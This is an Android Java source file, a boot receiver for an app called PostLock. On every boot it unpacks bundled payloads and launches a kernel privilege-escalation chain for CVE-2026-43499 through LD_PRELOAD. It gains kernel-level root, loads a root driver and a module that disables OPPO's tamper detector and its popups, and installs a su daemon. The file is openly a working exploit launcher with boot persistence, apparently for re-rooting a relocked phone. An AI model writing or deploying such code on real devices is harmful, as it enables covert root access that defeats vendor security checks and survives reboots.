package org.postlock.boot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * PostLockBoot: on BOOT_COMPLETED dispatch the CVE-2026-43499 exploit
 * chain via LD_PRELOAD.  The preload constructor runs the whole exploit
 * synchronously inside the child /system/bin/sh; its KS_COLDSTART fork
 * then runs the extracted restore.sh as uid0 kernel domain:
 *   kernelsu.ko (real BakaSU driver) + ocsk.ko (OPPO detector fuse +
 *   popup suppression) + su daemon + /product/bin overlay + manager
 *   appid.  Restore targets the BakaSU manager app; this app only
 *   provides the missing boot trigger on the relocked stock kernel
 *   (no APatch/su survives there, and nothing else on the device can
 *   re-run the chain).
 *
 * All payloads live in this app's private storage (app_data_file label),
 * so the untrusted_app domain needs no special SELinux access to read
 * or dlopen them; the escalate part runs in the kernel domain supplied
 * by the chain.  Requires the one-time OPPO auto-start permission for
 * THIS app (Settings -> App management -> PostLock).
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "PostLockBoot";
    // bump when any asset payload changes -> re-extract on next boot
    private static final String PAYLOAD_VERSION = "v1-20261019";
    private static final String[] PAYLOAD = {
            "preload.so", "su", "kernelsu.ko", "finitmod", "ocsk.ko", "restore.sh",
    };

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) {
            return;
        }
        String action = intent.getAction();
        if (!Intent.ACTION_BOOT_COMPLETED.equals(action)
                && !Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action)
                && !"org.postlock.boot.LAUNCH".equals(action)) {
            return;
        }
        // LOCKED_BOOT_COMPLETED is skipped on purpose: the credential
        // encrypted filesDir is unreadable before first unlock.
        if (!Intent.ACTION_BOOT_COMPLETED.equals(action)
                && !"org.postlock.boot.LAUNCH".equals(action)) {
            Log.i(TAG, "skip " + action + " (CE storage sealed)");
            return;
        }
        try {
            File dir = extractPayload(context);
            triggerChain(dir);
            Log.i(TAG, "chain dispatched from " + action
                    + " (payload " + PAYLOAD_VERSION + ")");
        } catch (Throwable e) {
            Log.e(TAG, "trigger failed", e);
        }
    }

    private File extractPayload(Context context) throws Exception {
        File dir = new File(context.getFilesDir(), "postlock");
        File ver = new File(dir, ".ver");
        File restore = new File(dir, "restore.sh");
        if (ver.isFile() && PAYLOAD_VERSION.equals(readAllText(ver)) && restore.isFile()) {
            return dir;
        }
        if (!dir.isDirectory() && !dir.mkdirs()) {
            throw new java.io.IOException("cannot create " + dir);
        }
        AssetManager am = context.getAssets();
        for (String name : PAYLOAD) {
            File out = new File(dir, name);
            try (InputStream in = am.open("postlock/" + name);
                 OutputStream os = new FileOutputStream(out)) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }
            // exec bit matters: the chain gates finitmod/su on X_OK
            if (!out.setExecutable(true, false)) {
                Log.w(TAG, "setExecutable failed for " + name);
            }
        }
        try (FileOutputStream os = new FileOutputStream(ver)) {
            os.write(PAYLOAD_VERSION.getBytes());
        }
        return dir;
    }

    private void triggerChain(File dir) throws Exception {
        String ps = dir.getAbsolutePath();
        // Env aligned with the proven tools/postlock.sh TRIGGER_ENV from
        // the CVE-2026-43499 repo.  KSUD_DST sits directly under
        // /data/local/tmp: this app cannot mkdir ksu_boot there
        // (shell_data_file), and the write itself happens after escalation
        // (kernel domain).  /system/bin/sh, NOT toybox sh: toybox here has
        // no sh builtin.
        String cmdline = "LD_PRELOAD=" + ps + "/preload.so "
                + "KS_LOG_SYNC=1 KS_PSELECT_BSS_LOCK=1 KS_CFGFS_LOG=1 "
                + "KS_PAYLOAD_SCAN=1 KSNITCH_VERBOSE=1 "
                + "KS_RECLAIM_DETERMINISTIC=1 KS_PSELECT_FOPS_VOFF=1 "
                + "KSUD_DST=/data/local/tmp/ksud KSUD_NO_PARENT_INSTALL=1 SU_INSTALL=0 "
                + "KS_COLDSTART=" + ps + "/restore.sh "
                + "KS_FINITMOD=" + ps + "/finitmod KS_KO=" + ps + "/kernelsu.ko "
                + "KS_PIPE_SLABS=15 KS_PAYLOAD_BASE_FILE=/data/local/tmp/skbdelta "
                + "/system/bin/sh -c echo_CHAIN_EXIT_DONE";
        ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", cmdline)
                .redirectOutput(ProcessBuilder.Redirect.to(new File(dir, "chain.log")))
                .redirectErrorStream(true);
        pb.start();   // fire-and-forget: the receiver must not block boot
    }

    private static String readAllText(File f) throws Exception {
        try (FileInputStream in = new FileInputStream(f);
             ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buf = new byte[256];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            return out.toString("UTF-8");
        }
    }
}
